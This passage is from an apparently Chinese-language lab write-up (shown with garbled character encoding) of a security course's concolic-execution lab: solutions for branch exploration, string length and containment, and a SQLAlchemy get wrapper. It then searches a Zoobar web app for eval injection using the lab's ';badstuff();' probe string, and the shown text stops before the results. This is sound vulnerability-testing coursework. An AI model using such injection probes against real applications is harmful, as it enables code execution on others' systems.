<li>ä½¿ç”¨ <code>concolic_force_branch()</code> æ¥æ„å»ºä¸€ä¸ªåˆ†æ”¯çš„å¦ä¸€è·¯å¾„çº¦æŸ</li>
<li>è‹¥çº¦æŸå·²ç»åœ¨ <code>check</code> é›†åˆä¸­ï¼Œå°†å…¶è·³è¿‡ï¼Œå¦åˆ™åŠ å…¥é›†åˆä¸­</li>
<li>ä½¿ç”¨ <code>concolic_find_input()</code> ä»¥æ„å»ºä¸€ä¸ªåŸºäºå¦ä¸€è·¯å¾„çº¦æŸçš„æ–°çš„æµ‹è¯•è¾“å…¥</li>
<li>Z3 å¯èƒ½ä¸ä¼šä¸ºæ¯ä¸ªå˜é‡åˆ†é…å€¼ï¼ˆä¾‹å¦‚å˜é‡å¯èƒ½ä¸çº¦æŸæ— å…³ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸Šæ¬¡ä½¿ç”¨çš„å­—å…¸ç»§æ‰¿åˆ° <code>concolic_find_input()</code> è¿”å›çš„æ–°å­—å…¸ä¸­ï¼Œå°†æ–°çš„å­—å…¸æ·»åŠ åˆ° <code>input</code> é˜Ÿåˆ—ä¸­</li>
</ul>
<p>ä¾ç…§ä»¥ä¸Šæ€è·¯ï¼Œç¬”è€…æœ€ååœ¨å¤§å¾ªç¯æœ«å°¾è¡¥å…¨ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 6ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è‡³æ­¤ï¼ŒLab 3 çš„ Part 1 <strong>å…¨éƒ¨å®Œæˆ</strong></p>
<h2 id="Concolic-execution-for-strings-and-Zoobar"><a href="#Concolic-execution-for-strings-and-Zoobar" class="headerlink" title="Concolic execution for strings and Zoobar"></a>Concolic execution for strings and Zoobar</h2><p>é¦–å…ˆæ˜¯ Exercise 7ï¼Œè¡¥å…¨å¯¹å­—ç¬¦ä¸²ä¸å­—ç¬¦æ•°ç»„çš„ä¸¤ç§è¿ç®—æ”¯æŒï¼šé•¿åº¦ï¼ˆ<code>__len__</code>ï¼‰ä¸åŒ…å«ï¼ˆ<code>__contains__</code>ï¼‰</p>
<blockquote>
<p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Pythonâ€™s â€œa in bâ€ construct).</p>
<p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p>
<p>Run <strong>.&#x2F;check-concolic-str.py</strong> <em>and</em> <strong>.&#x2F;check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p>
</blockquote>
<p>å¯¹äºç¬¦å·å€¼è€Œè¨€è¯¥æ¡†æ¶å·²ç»æä¾›äº†å°è£…å¥½çš„ <code>sym_contains</code> ä¸ <code>sym_length</code> ï¼Œæˆ‘ä»¬åªéœ€è¦å®ç°å¯¹å…·ä½“å€¼çš„åˆ¤æ–­å³å¯ï¼Œè¿™é‡Œåˆ«å¿˜äº†æœ€åçš„è¿”å›å€¼åº”å½“è°ƒç”¨ <code>concolic_bool()</code> ä»¥åœ¨å…¨å±€åˆ—è¡¨ä¸­æ·»åŠ è·¯å¾„çº¦æŸä¸ä¿¡æ¯</p>
<p>å¾…è¡¥å…¨çš„ä¸¤å¤„çš†ä¸ºä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 7ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ Zoobar ä¸­å®Œæˆä¸€ä¸ª <code>concolic HTTP request</code>ï¼Œå› æ­¤å¾…æŸ¥è¯¢çš„ username ä¹Ÿå°†ä¸ºä¸€ä¸ªæ··åˆå€¼ï¼ˆç”± HTTP cookie å¸¦æ¥ï¼‰ï¼Œäºæ˜¯æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨ SQL æŸ¥è¯¢ä¸Šåº”ç”¨æ··åˆæ‰§è¡Œï¼Œä½† SQLite ç”± C è€Œé Python ç¼–å†™ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¿®æ”¹å…¶å†…éƒ¨ä»£ç </p>
<p>äºæ˜¯æ¥ä¸‹æ¥æ¥åˆ° Exercise8ï¼Œå¯¹ SQL çš„ <code>get()</code> åº”ç”¨ä¸€å±‚ wrapper ä»¥å¯¹ SQL è¯­å¥çš„ç»“æœåº”ç”¨æ··åˆæ‰§è¡Œï¼š</p>
<blockquote>
<p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, weâ€™ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>.&#x2F;check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p>
<p>You will likely need to consult the reference for the <a target="_blank" rel="noopener" href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p>
<p>Run <strong>.&#x2F;check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p>
</blockquote>
<p>é‚£æˆ‘ä»¬å…ˆçœ‹çœ‹ <code>./check-symex-sql.py</code> é‡Œé¢çš„ä¸»ä½“é€»è¾‘ï¼ˆå…³äº SQLalchemy åº“ç›¸å…³çš„å¯ä»¥å…ˆçœ‹ <a target="_blank" rel="noopener" href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ï¼‰ï¼Œé¦–å…ˆå£°æ˜äº† <code>Test1Base</code> å’Œ <code>Test2Base</code>ï¼Œè¿™ä¸¤ä¸ªç›¸å½“äºä¸¤ç»„ä¸åŒçš„æµ‹è¯•ç”¨ä¾‹ï¼Œæˆ‘ä»¬ä»…åˆ†æå…¶ä¸­ä¸€ç»„å³å¯ï¼Œä¹‹åå®šä¹‰äº†ç±» <code>Test1</code> ç»§æ‰¿è‡ª <code>Test1Base</code>ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“è®¾ç½®äº†ä¸¤åˆ—ï¼Œå…¶ä¸­ <code>name</code> ä¸ºä¸»é”®ï¼š</p>
<blockquote>
<p>è¿™é‡ŒæŒ‰ç…§ç¬”è€…çš„ç†è§£ï¼Œä¸€ä¸ª <code>Test1</code> å®ä¾‹è¡¨ç¤ºçš„åº”è¯¥æ˜¯åœ¨è¯¥æ•°æ®åº“ä¸­ä¸€è¡Œçš„æ•°æ®</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure>

<p>ä¹‹åæ˜¯æ•°æ®åº“åˆå§‹åŒ–å·¥ä½œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>test_f()</code> ä¸­ä¼šè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸² <code>s</code>ï¼Œå°†å…¶ä½œä¸ºå‚æ•°ç»™åˆ°æ•°æ®åº“çš„ get å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ <code>query()</code> å±•å¼€æ¥å…¶å®æ˜¯ <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> è¿™æ ·çš„ SQL è¯­å¥ï¼ˆæ¯”è¾ƒç¬¨çš„åŠæ³•å°±æ˜¯å¯ä»¥é€šè¿‡åœ¨ <code>get()</code> ä¸­æ‰“å° <code>query</code> çš„æ–¹å¼æŸ¥çœ‹ï¼‰ï¼Œå…¶ä¸­é€‰æ‹©çš„éƒ½æ˜¯æˆ‘ä»¬ä¸º <code>Test1</code> ç±»æ‰€å®šä¹‰çš„å˜é‡ï¼Œè€Œ <code>get()</code> çš„åŸå§‹ä½œç”¨åˆ™ä¸ºä»æŸ¥è¯¢ç»“æœä¸­é€‰æ‹©ç¬¦åˆæ¡ä»¶çš„ä¸€è¡Œ</p>
<p>å®Œæˆä¸Šè¿°å®šä¹‰ä¹‹åï¼Œåœ¨æ–‡ä»¶ä¸­é¦–å…ˆè°ƒç”¨ <code>test1_setup()</code> è¿›è¡Œæ•°æ®åº“ <code>&quot;test1&quot;</code> çš„åˆ›å»ºï¼Œå¹¶æ·»åŠ äº†ä¸¤è¡Œæ•°æ®ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure>

<p>æœ€åå¯¹ <code>test_f()</code> åº”ç”¨æ··åˆæ‰§è¡Œï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ¥åˆ°æˆ‘ä»¬éœ€è¦è¡¥å…¨ä»£ç çš„ <code>symex/symsql.py</code> å½“ä¸­ï¼Œæ•´ç†é€»è¾‘éå¸¸ç®€å•ï¼Œåªå®šä¹‰äº†ä¸€ä¸ªå¾…æˆ‘ä»¬è¡¥å…¨çš„ <code>newget()</code>ï¼Œå¹¶ç”¨å…¶æ›¿æ¢æ‰äº†åŸæœ‰çš„ <code>get()</code> å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure>

<p>å‚æ•° <code>query</code> å…¶å®å°±æ˜¯åé¢åˆ›å»ºçš„ Query å¯¹è±¡ä¸­çš„ <code>self</code>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹ SQLAlchemy æ–‡æ¡£ä¸­æœ‰æ²¡æœ‰æ¯”è¾ƒæœ‰ç”¨çš„æ–¹æ³•ï¼Œå®é™…ä¸Šåœ¨æ•°æ®åº“çš„ <code>å¢åˆ æ”¹æŸ¥</code> å½“ä¸­ï¼Œå¯¹äºæœ¬é¢˜è€Œè¨€æˆ‘ä»¬åªéœ€è¦å…³æ³¨â€œæŸ¥â€ï¼Œæ³¨æ„åˆ°æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•å¯ä»¥å°†æŸ¥è¯¢ç»“æœä»¥åˆ—è¡¨çš„å½¢å¼è¿”å›ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ–‡æ¡£é‡Œæ²¡æœ‰ä»”ç»†è¯´æ¸…æ¥šï¼ˆ <del>ä¹Ÿå¯èƒ½æ˜¯ğŸ‘´æ²¡ä»”ç»†çœ‹</del> ï¼‰ï¼Œç¬”è€…å®æµ‹äº†ä¸€ä¸‹ï¼Œè¿”å›çš„åˆ—è¡¨çš„æˆå‘˜çš†ä¸º <code>Test1</code> æˆ– <code>Test2</code> ç±»å‹çš„å¯¹è±¡å®ä¾‹ï¼Œå³ <code>ä¸€è¡Œçš„æ•°æ®</code>ï¼Œè¿™é‡Œæˆ‘ä»¬åŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºåœ¨ <code>test1</code> æ•°æ®åº“ä¸­æœ‰ä¸¤ä¸ª <code>Test1</code>ï¼ˆä¸¤è¡Œï¼‰ï¼Œåˆšå¥½å¯¹åº”ä¸€å¼€å§‹æ·»åŠ è¿›å»çš„ä¸¤è¡Œï¼š</p>
<p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å…¶å®å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œ<code>get()</code> çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º <code>primary_key</code>ï¼Œå³æˆ‘ä»¬åªéœ€è¦å¯¹æ¯”æŸ¥è¯¢ç»“æœæ‰¾åˆ°å…¶ä¸­ <code>primary_key</code> çš„å€¼ä¸ä¼ å…¥çš„å‚æ•°å€¼ç›¸åŒçš„é‚£ä¸€è¡Œå¹¶å°†å…¶è¿”å›å³å¯</p>
<p>åœ¨å¾…æ··åˆæ‰§è¡Œå‡½æ•° <code>test_f()</code> ä¸ <code>test_g()</code> å½“ä¸­ä¼ å…¥çš„ <code>primary_key()</code> çš†ä¸º <code>concolic</code> ç±»å‹å˜é‡ï¼Œè€Œæˆ‘ä»¬å·²ç»å®Œæˆäº† <code>concolic_int</code> ä¸ <code>concolic_str</code> çš„ <code>__cmp__</code> è¿ç®—ç¬¦é‡è½½ï¼Œå› æ­¤åœ¨é‡å†™çš„ get å‡½æ•°ä¸­ç›´æ¥ä½¿ç”¨ <code>==</code> è¿›è¡Œå¯¹æ¯”å³å¯</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æˆ‘ä»¬çŸ¥é“ <code>Test1</code> çš„ä¸»é”®ä¸º <code>name</code>ï¼Œä½†è¿™é‡Œç›¸æ¯”èµ·ç›´æ¥ä½¿ç”¨ <code>row.name</code>ï¼Œæˆ‘ä»¬éœ€è¦ä¸”åº”å½“å†™ä¸€ä¸ª<strong>æ›´ä¸ºé€šç”¨çš„æ–¹æ³•</strong>ï¼Œåœ¨æ³¨é‡Šä¸­æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>r.__table__.primary_key.columns.keys()[0]</code> è·å–ä¸»é”®åçš„å­—ç¬¦ä¸²ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Python çš„å†…ç½®æ–¹æ³• <code>getattr()</code> æ¥è·å–ä¸»é”®çš„å€¼ï¼Œå› æ­¤æœ€åçš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 8ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>æ³¨æ„è¿™é‡Œéœ€è¦<strong>é¢å¤–é€šè¿‡ Exercise 9 çš„ç¬¬ä¸€é¡¹æ‰è¡¨ç¤ºåšå¯¹äº†</strong>ï¼Œå› ä¸ºåé¢éœ€è¦å€ŸåŠ©è¿™é‡Œçš„ç¬¦å·æ‰§è¡Œä»£ç æ¼”ç¤ºä¸€äº›ä¸œè¥¿</p>
</blockquote>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹å¯¹ Zoobar åº”ç”¨æˆ‘ä»¬çš„æ··åˆæ‰§è¡Œæ¡†æ¶äº†ï¼Œæˆ‘ä»¬é¦–å…ˆå°è¯•è¿è¡Œ <code>./check-symex-zoobar.py</code>ï¼Œåœ¨å…¶ä¸­æœ‰ç€å¯¹ Zoobar ä½¿ç”¨ç¬¦å·è¾“å…¥çš„ç›¸å…³é€»è¾‘ï¼Œä¸”ä¸ºäº†è®©æ··åˆæ‰§è¡Œèƒ½å¤Ÿå¿«é€Ÿç»“æŸï¼Œå…¶è¿‡åº¦çº¦æŸäº†ç»™äºˆ Zoobar çš„è¾“å…¥ï¼Œæ­¤å¤–æ‰€æœ‰çš„ HTTP è¯·æ±‚æ–¹æ³•ï¼ˆäº <code>environ[&#39;REQUEST_METHOD&#39;]</code> ä¸­ï¼‰çš†ä¸º <code>GET</code>ï¼Œä¸”è¯·æ±‚çš„æ‰€æœ‰ UQLï¼ˆäº <code>environ[&#39;PATH_INFO&#39;]</code> ä¸­ï¼‰çš†ä»¥ <code>trans</code> èµ·å§‹</p>
<p>ç›¸è¾ƒäºç›´æ¥è¿è¡Œï¼ŒLab æ›´æ¨èä½¿ç”¨ <code>script</code> æ¥è¿è¡Œï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure>

<p>ä¹‹åå±å¹•ä¸Šä¼šæŒç»­æ‰“å‡ºä¸€å †ä¿¡æ¯ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å¤§æ¦‚åå‡ ç§’åç»“æŸï¼Œè¿­ä»£çš„æ•°é‡è¡¨ç¤ºä¸åŒçš„è·¯å¾„ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<blockquote>
<p>å’Œå®éªŒæ‰‹å†Œä¸­ä¸åŒçš„æ˜¯ç¬”è€…è¿™é‡Œæœ‰ <code>142 iterations</code>ï¼Œä½†åœ¨å®éªŒæ‰‹å†Œé‡Œæ˜¯ <code>139</code>ï¼Œè¿™é‡Œæš‚ä¸”å…ˆä¸ç®¡ï¼ˆ</p>
</blockquote>
<p>ç”±äº Zoobar ç”± Python ç¼–å†™ï¼Œæ•…ä¸ä¼šæœ‰å†…å­˜æŸåè¿™ä¸€ç±»çš„æ¼æ´ï¼ˆè¿™å¥è¯æ˜¯å®éªŒæ‰‹å†Œè¯´çš„ï¼Œä½†æ˜¯<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>å’Œä¸€ä¼—å…¶ä»– CVE è¡¨ç¤ºï¼šæ€ä¹ˆä¼šæ˜¯å‘¢ï¼Ÿï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æ²¡æ³•ç«‹åˆ»è¾¨æ˜åœ¨è¿™ä¸€ç™¾å¤šè·¯å¾„ä¸­æ˜¯å¦å­˜åœ¨é—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›æ˜¾å¼çš„ä¸å˜é‡ï¼ˆinvariantï¼‰æ¥æ•æ‰è¡¨ç¤ºå®‰å…¨é—®é¢˜çš„æƒ…å†µ</p>
<p>Lab å·²ç»å®ç°äº†çš„ä¸€ä¸ªä¸å˜é‡ä¾¿æ˜¯ eval injectionâ€”â€”å³å¯¹ <code>eval()</code> çš„å‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ <code>symex/symeval.py</code> ä¸­ Lab ç»™å‡ºäº†å¯¹è¿™ç§æƒ…å†µçš„æ£€æŸ¥æ€è·¯ï¼šè‹¥ä¼ ç»™ <code>eval()</code> çš„å­—ç¬¦ä¸²å¯ä»¥åŒ…å«  <code>;badstuff();</code> ï¼Œè¯´æ˜æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª eval injection æ¼æ´â€”â€”ç”±æ­¤æˆ‘ä»¬å¯ä»¥è®©æ··åˆæ‰§è¡Œç³»ç»Ÿå»å°è¯•æ„å»ºèƒ½åŒ…å«è¯¥å­ä¸²çš„å­—ç¬¦ä¸²</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ Zoobar ä¸­æ˜¯å¦å­˜åœ¨ eval injection æ¼æ´ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹ï¼Œå‘ç°äº†ä¸¤ä¸ª eval injectionï¼š</p>
